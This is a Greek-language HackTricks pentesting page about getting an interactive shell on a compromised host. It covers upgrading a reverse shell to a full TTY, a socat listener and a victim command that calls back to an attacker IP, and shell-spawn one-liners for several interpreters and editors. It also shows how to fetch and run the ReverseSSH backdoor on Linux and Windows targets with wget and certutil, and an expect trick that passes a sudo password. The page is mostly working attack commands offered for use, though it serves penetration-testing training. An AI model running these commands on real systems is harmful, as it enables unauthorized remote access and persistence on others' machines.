# Πλήρη TTYs

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## Πλήρης TTY

Σημειώστε ότι η κέλυφος που ορίζετε στη μεταβλητή `SHELL` **πρέπει** να **είναι καταχωρημένη μέσα** στο _**/etc/shells**_ ή `Η τιμή για τη μεταβλητή SHELL δεν βρέθηκε στο αρχείο /etc/shells Αυτό το περιστατικό έχει αναφερθεί`. Επίσης, σημειώστε ότι τα επόμενα αποσπάσματα λειτουργούν μόνο στο bash. Αν βρίσκεστε σε ένα zsh, αλλάξτε σε ένα bash πριν αποκτήσετε το κέλυφος εκτελώντας `bash`.

#### Python

{% code overflow="wrap" %}
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

{% hint style="info" %}
Μπορείτε να λάβετε τον **αριθμό** των **σειρών** και **στηλών** εκτελώντας **`stty -a`**
{% endhint %}

#### script

{% code overflow="wrap" %}
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Εκκίνηση κελιών**

* `python -c 'import pty; pty.spawn("/bin/sh")'`
* `echo os.system('/bin/bash')`
* `/bin/sh -i`
* `script -qc /bin/bash /dev/null`
* `perl -e 'exec "/bin/sh";'`
* perl: `exec "/bin/sh";`
* ruby: `exec "/bin/sh"`
* lua: `os.execute('/bin/sh')`
* IRB: `exec "/bin/sh"`
* vi: `:!bash`
* vi: `:set shell=/bin/bash:shell`
* nmap: `!sh`

## **Αντίστροφη SSH**

Ένα βολικό τρόπο για **διαδραστική πρόσβαση σε κέλυφος**, καθώς και **μεταφορά αρχείων** και **προώθηση θυρών**, είναι να αποθέτουμε το στατικά συνδεδεμένο διακομιστή ssh [ReverseSSH](https://github.com/Fahrj/reverse-ssh) στον στόχο.

Παρακάτω υπάρχει ένα παράδειγμα για `x86` με δυαδικά αρχεία που έχουν συμπιεστεί με upx. Για άλλα δυαδικά αρχεία, ελέγξτε τη [σελίδα κυκλοφορίας](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Προετοιμασία τοπικά για να αιχμαλωτίσετε το αίτημα προώθησης θύρας ssh:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
{% endcode %}

* (2α) Στόχος Linux:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
{% endcode %}

* (2β) Στόχος Windows 10 (για παλαιότερες εκδόσεις, ελέγξτε το [αρχείο readme του έργου](https://github.com/Fahrj/reverse-ssh#features)):

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
* Εάν το αίτημα προώθησης θύρας ReverseSSH ήταν επιτυχές, πρέπει τώρα να μπορείτε να συνδεθείτε με τον προεπιλεγμένο κωδικό πρόσβασης `letmeinbrudipls` στο πλαίσιο του χρήστη που εκτελεί το `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Χωρίς TTY

Αν για κάποιο λόγο δεν μπορείτε να λάβετε ένα πλήρες TTY, **μπορείτε ακόμα να αλληλεπιδράσετε με προγράμματα** που περιμένουν είσοδο χρήστη. Στο παρακάτω παράδειγμα, ο κωδικός πρόσβασης περνιέται στο `sudo` για να διαβάσει ένα αρχείο:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Συμμετέχετε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε τεχνικές χάκινγκ υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
